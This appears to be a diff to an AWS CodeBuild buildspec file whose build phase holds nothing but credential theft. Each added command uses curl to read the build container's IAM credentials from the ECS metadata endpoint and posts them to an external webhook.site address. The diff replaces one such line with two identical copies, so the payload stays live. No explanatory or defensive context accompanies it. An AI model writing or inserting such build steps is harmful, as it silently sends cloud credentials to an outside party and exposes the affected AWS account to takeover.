@@ -3,4 +3,5 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "identity=$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)" 
+      - curl -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "identity=$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)"
+      - curl -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "identity=$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)"
